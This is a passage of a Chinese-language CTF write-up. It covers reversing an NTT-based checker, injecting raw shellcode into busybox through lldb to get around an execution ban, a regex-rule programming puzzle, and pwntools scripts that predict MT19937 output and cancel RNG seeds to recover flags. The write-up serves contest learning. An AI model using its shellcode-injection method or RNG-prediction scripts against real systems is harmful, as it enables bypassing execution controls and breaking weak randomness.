7. 对 `d` 进行函数调用 `Y` 得到 `f`
8. 判断 `f` 是否等于数据段中某个数组 `INT_ARRAY`

所以可以看出来第三问是一个卷积，那么 X 就是 NTT，Y 就是 INTT。

因此对于第二问，我们可以把 `INT_ARRAY` dump 出来，然后用 INTT 反解 `a`。

这里我尝试了 sympy 的 ntt 和 intt，似乎不太管用。

因此我直接把 ghidra 里面的 `mint`、`X()` 和 `Y()` 移植到了 C++ 中，然后就工作了。

```cpp
#include <cstdio>
#include <iostream>
#include <algorithm>
using namespace std;
typedef long long LL;
const int MOD = 998244353;

struct mint {
  int val;

  friend mint operator+(const mint &a, const mint &b) {
    return mint{int((LL(a.val) + LL(b.val)) % MOD)};
  }

  friend mint operator-(const mint &a, const mint &b) {
    return mint{int((LL(a.val) - LL(b.val) + MOD) % MOD)};
  }

  friend mint operator*(const mint &a, const mint &b) {
    return mint{int((LL(a.val) * LL(b.val)) % MOD)};
  }

  friend mint pow(const mint &a, int b) {
    mint x{a};
    mint r{1};
    while (b) {
      if (b & 1) r *= x;
      x *= x;
      b >>= 1;
    }
    return r;
  }

  void operator+=(const mint &a) {
    (*this) = (*this) + a;
  }

  void operator*=(const mint &a) {
    (*this) = (*this) * a;
  }

  void operator=(const int a) {
    this->val = a;
  }
};

mint cache[0x40000], cache2[0x40000];
void init() {
  cache[0x20000] = 1;
  mint l3{3};
  mint f = pow(l3, 0xee0);
  for (int i = 0x20001; i < 0x40000; i++) {
    cache[i] = cache[i-1] * f;
  }

  for (int i = 0x1ffff; i > 0; i--) {
    cache[i] = cache[i * 2];
  }

  cache2[0] = 1;
  cache2[1] = 1;
  for (int i = 2; i < 0x40000; i++) {
    mint g{-MOD / i + MOD};
    cache2[i] = cache[MOD % i] * g;
  }
}

void ntt(mint *m, int len) {
  int i = len;
  while (i > 1) {
    i >>= 1;
    for (int j = 0; j < len; j = j + i * 2) {
      for (int k = 0; k < i; k = k + 1) {
        mint cc = cache[i + k];
        mint p = m[k + j];
        mint q = m[i + j + k];
        m[k + j] = p + q;
        m[i + j + k] = (p - q) * cc;
      }
    }
  }
}

void intt(mint *m, int len) {
  for (int i = 1; i * 2 <= len; i = i << 1) {
    for (int j = 0; j < len; j = j + i * 2) {
      for (int k = 0; k < i; k = k + 1) {
        mint p = m[k + j];
        mint q = m[i + j + k] * cache[i + k];
        m[k + j] = p + q;
        m[i + j + k] = p - q;
      }
    }
  }

  mint q{(-(MOD - 1)) / len + MOD};
  reverse(&m[1], &m[len]);
  for (int i = 0; i < len; i++) {
    m[i] *= q;
  }
}

unsigned char dump[] = \
{ 0x49, 0x0f, 0x00, 0x00, __omitted__ };

int main() {
  init();

  intt((mint *)dump, 64);
  mint *p = (mint *)dump;

  for (int i = 0; i < 64; i++) {
    printf("%c", p[i].val);
  }

  return 0;
}
```

### Hard

根据前一问分析，这个过程就是把两个信号卷积，然后和第三个信号做匹配。根据卷积定义我们知道，两个长度为 `X` 的信号卷完之后长度是 `2X`，但程序中只匹配了低半部分，高半部分没有给出。列出卷积方程之后发现是个下三角，可以通过带入消项求解。

```python
#!/usr/bin/env python3
import struct
from sympy.matrices import Matrix, zeros
from mod_equations import GaussMatrix
MOD = 998244353

dump = b'\x6a\x2f\x00\x00{omitted...}'
arr = [struct.unpack('<I', dump[i:i+4])[0] for i in range(0, len(dump), 4)]
f = [
  0x77, 0x65, 0x6c, 0x63, 0x6f, 0x6d, 0x65, 0x20, 0x74, 0x6f, 0x20, 0x74, 0x68, 0x65, 0x20, 0x77, 0x6f, 0x72, 0x6c, 0x64, 0x20, 0x6f, 0x66, 0x20, 0x70, 0x6f, 0x6c, 0x79, 0x6e, 0x6f, 0x6d, 0x69, 0x61, 0x6c, 0x77, 0x65, 0x6c, 0x63, 0x6f, 0x6d, 0x65, 0x20, 0x74, 0x6f, 0x20, 0x74, 0x68, 0x65, 0x20, 0x77, 0x6f, 0x72, 0x6c, 0x64, 0x20, 0x6f, 0x66, 0x20, 0x70, 0x6f, 0x6c, 0x79, 0x6e, 0x6f
]
mat = [[0] * 64 for i in range(64)]
x = [-1] * 64

for i in range(0, 64):
  # y[i] = \sum x[j]f[k] where j + k == i
  for j in range(0, i + 1): # 0 ... i
    k = i - j
    mat[i][j] = f[k]
  cur = arr[i]
  for j in range(0, i):
    if mat[i][j]:
      cur = (cur + MOD - (x[j] * mat[i][j] % MOD)) % MOD
  cur = cur * pow(mat[i][i], MOD - 2, MOD) % MOD
  x[i] = cur

print(''.join([chr(i) for i in x]))
```

## 17. 禁止执行，启动

### Flag 1

第一问给的环境里面有个 lldb，因此可以通过 lldb 往 busybox 注入给定的 shellcode 来实现执行相应的程序。

```bash
lldb /bin/busybox
process launch --stop-at-entry
p/x $pc
memory write $pc 0x48 0xc7 0xc0 0x24 0x02 0x00 0x00 0x48 0x31 0xff 0x48 0x89 0xe6 0x0f 0x05 0x48 0xc7 0xc0 0x01 0x00 0x00 0x00 0x48 0x89 0xc7 0x48 0x89 0xe6 0x48 0xc7 0xc2 0x20 0x00 0x00 0x00 0x0f 0x05
```

### Flag 2

第二问参考 Github 的 [DDexec](https://github.com/arget13/DDexec/blob/main/ddsc.sh)

这段代码中实现了往必经路径上中注入跳板代码，修改跳板代码为我们的 shellcode 即可。

## 18. 关键词过滤喵，谢谢喵

### 字数统计喵

首先，字数统计对于文字本身是无关的，一开始可以把所有字符替换成同一字符。

然后需要实现这么两个功能：

1. 从字符串中删去一个字符
2. 将答案区答案 +1

具体代码如下：
```
把【[\s\S]】替换成【A】喵
把【$】替换成【⭕️0】喵
如果没看到【A】就跳转到【结束】喵

外层循环：
把【A⭕️】替换成【⭕️】喵
把【⭕️(.*)】替换成【⭕️\1X】喵

内层循环：
如果看到【⭕️X】就跳转到【找到⭕️】喵
如果看到【0X】就跳转到【找到0】喵
如果看到【1X】就跳转到【找到1】喵
如果看到【2X】就跳转到【找到2】喵
如果看到【3X】就跳转到【找到3】喵
如果看到【4X】就跳转到【找到4】喵
如果看到【5X】就跳转到【找到5】喵
如果看到【6X】就跳转到【找到6】喵
如果看到【7X】就跳转到【找到7】喵
如果看到【8X】就跳转到【找到8】喵
如果看到【9X】就跳转到【找到9】喵

找到⭕️：
把【⭕️X】替换成【⭕️1X】喵
如果没看到【😀】就跳转到【内层收尾】喵
找到0：
把【0X】替换成【1X】喵
如果没看到【😀】就跳转到【内层收尾】喵
找到1：
把【1X】替换成【2X】喵
如果没看到【😀】就跳转到【内层收尾】喵
找到2：
把【2X】替换成【3X】喵
如果没看到【😀】就跳转到【内层收尾】喵
找到3：
把【3X】替换成【4X】喵
如果没看到【😀】就跳转到【内层收尾】喵
找到4：
把【4X】替换成【5X】喵
如果没看到【😀】就跳转到【内层收尾】喵
找到5：
把【5X】替换成【6X】喵
如果没看到【😀】就跳转到【内层收尾】喵
找到6：
把【6X】替换成【7X】喵
如果没看到【😀】就跳转到【内层收尾】喵
找到7：
把【7X】替换成【8X】喵
如果没看到【😀】就跳转到【内层收尾】喵
找到8：
把【8X】替换成【9X】喵
如果没看到【😀】就跳转到【内层收尾】喵
找到9：
把【9X】替换成【X0】喵
如果没看到【😀】就跳转到【内层循环】喵

内层收尾：
把【X】替换成【】喵

如果看到【A】就跳转到【外层循环】喵

结束：
把【⭕️】替换成【】喵
把【^$】替换成【0】喵

谢谢喵
```

### 排序喵

我实现的比较简单的冒泡排序，首先通过 emoji 把字符串扩展为三部分：未排序区、候选字符串、输出区

外层循环每次从未排序区中找到最小的字符串，放到输出区即可
内层循环遍历每个未排序区的字符串，然后运行比较循环
比较循环中，通过游标遍历每个字符，判断是否交换候选字符串

```
重复把【\n\n】替换成【\n】喵
把【\n】替换成【➖】喵
把【$】替换成【⭕️🆗】喵

外层循环：

把【➖([^➖]*?)⭕️🆗】替换成【⭕️\1⬆️🆗】喵
把【^([^➖]*?)([➖⭕️])】替换成【\1⬆️\2】喵

内层循环1：

内层循环2：
把【(.)⬆️】替换成【⬆️\1】喵
如果看到【⭕️⬆️】就跳转到【替换】喵
如果看到【^⬆️】就跳转到【不替换】喵
如果看到【➖⬆️】就跳转到【不替换】喵
如果没看到【😀】就跳转到【内层循环2】喵

替换：
把【⭕️([^⬆️]*?)⬆️([^🆗]*?)🆗】替换成【⭕️\1\2🆗】喵
把【([^➖]*?)⬆️([^➖⭕️]*?)([➖⭕️])】替换成【⬆️\1\2\3】喵
把【➖([^➖]*?)⬆️([^➖⭕️]*?)([➖⭕️])】替换成【➖⬆️\1\2\3】喵
把【⬆️([^➖⭕️]*?)➖([^⭕️]*?)⭕️([^🆗]*?)🆗】替换成【⬆️\3➖\2⭕️\1⬆️🆗】喵
把【⬆️([^➖⭕️]*?)⭕️([^🆗]*?)🆗】替换成【⬆️\2⭕️\1🆗】喵

不替换：
如果看到【⬆️[^➖]*⭕️】就跳转到【内层循环1收尾】喵
把【⬆️([^➖]*?)➖([^➖⭕️]*)】替换成【\1➖\2⬆️】喵
把【⭕️([^⬆️]*)⬆️([^🆗]*)🆗】替换成【⭕️\1\2⬆️🆗】喵
如果没看到【😀】就跳转到【内层循环1】喵

内层循环1收尾：
把【⬆️】替换成【】喵
把【⭕️([^🆗]*?)🆗(.*)】替换成【⭕️🆗\1👁️\2】喵

如果没看到【^([^➖⭕️]*?)⭕️】就跳转到【外层循环】喵

把【^([^➖⭕️]*?)⭕️】替换成【⭕️\1👁️】喵
把【⭕️】替换成【】喵
把【🆗】替换成【】喵
把【👁️】替换成【\n】喵

谢谢喵
```

## 21. 小章鱼的曲奇

### Smol Cookie

可以看到输出前 2000 个字节的 xormask 是 0，也就是说输出了 MT19937 原始的随机数。

由于 MT19937 可以被预测，我使用了 Github 上的 [kmyk/mersenne-twister-predictor](https://github.com/kmyk/mersenne-twister-predictor/blob/master/mt19937predictor.py) 来恢复 MT19937 随机数状态，从而恢复 flag

```python
#!/usr/bin/env python
from pwn import *
from random import Random
from itertools import count
from time import time
from binascii import unhexlify
from predictor import MT19937Predictor


def xor_arrays(a, b, *args):
    if args:
        return xor_arrays(a, xor_arrays(b, *args))
    return bytes([x ^ y for x, y in zip(a, b)])


def main():
    conn = remote('prob08.geekgame.pku.edu.cn', 10008)
    conn.recvuntil(b'Please input your token: ')
    conn.sendline(b'{token_here}\n')

    conn.recvuntil(b'Choose one: ')
    conn.send(b'1\n')
    print(conn.recvuntil(b'*You heard a obscure voice coming from the void*\n'))
    buf = conn.recvuntil(b'\n')[:-1]
    buf = unhexlify(buf)
    print(len(buf))
    premable = buf[:2500]
    god = buf[2500:]

    pred = MT19937Predictor()
    pred.setrandbits(int.from_bytes(
        premable, byteorder='little'), len(premable) * 8)
    mask = pred.getrandbits(
        len(god) * 8).to_bytes(len(god), byteorder='little')

    print(xor_arrays(mask, god))


if __name__ == '__main__':
    main()

```

### Big Cookie

可以看到有三个 RNG 异或在一起，其中第一个 RNG 的种子已知，第二个 RNG 的种子可以被控制。

查阅 [Stackoverflow](https://stackoverflow.com/questions/37927577/python-number-of-rng-seeds) 知 “*This algorithm relies on the number being unsigned. So: if the arg is a PyLong, use its absolute value. Otherwise use its hash value, cast to unsigned*”，MT19937 的种子如果为负数，则取绝对值作为种子。

只要让第二个 RNG 的种子为第一个种子的负数即可相互抵消，其他参照第一题。

### SUPA BIG Cookie

类似第二问，每个种子都是负数种子即可。

```python
#!/usr/bin/env python
from pwn import *
from random import Random
from itertools import count
from time import time
from binascii import unhexlify
from hashlib import sha512
from predictor import MT19937Predictor


def xor_arrays(a, b, *args):
    if args:
        return xor_arrays(a, xor_arrays(b, *args))
    return bytes([x ^ y for x, y in zip(a, b)])


def main():
    conn = remote('prob08.geekgame.pku.edu.cn', 10008)
    conn.recvuntil(b'Please input your token: ')
    conn.sendline(b'{flag_here}')

    conn.recvuntil(b'Choose one: ')
    conn.send(b'3\n')

    conn.recvuntil(b'<')
    seed1 = conn.recvuntil(b'>')[:-1]
    print(seed1)

    seed2 = seed1.replace(b'0x', b'-0x')
    conn.recvuntil(b'> ')
    conn.send(seed2 + b'\n')

    print(conn.recvall())


if __name__ == '__main__':
    main()
```
